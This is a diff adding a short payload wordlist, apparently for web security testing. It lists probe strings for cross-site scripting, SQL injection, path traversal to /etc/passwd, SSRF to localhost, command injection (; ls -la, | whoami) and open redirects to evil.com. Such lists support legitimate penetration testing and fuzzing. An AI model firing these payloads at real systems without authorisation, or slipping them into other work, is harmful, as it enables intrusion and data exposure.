@@ -1,0 +1,25 @@
+# XSS
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+
+# SQLi
+' OR '1'='1
+' UNION SELECT NULL, NULL, NULL --
+admin' -- 
+
+# LFI
+../../../../etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+
+# SSRF
+http://127.0.0.1
+http://localhost/admin
+
+# Command Injection
+; ls -la
+| whoami
+
+# Open Redirect
+https://evil.com
+//evil.com
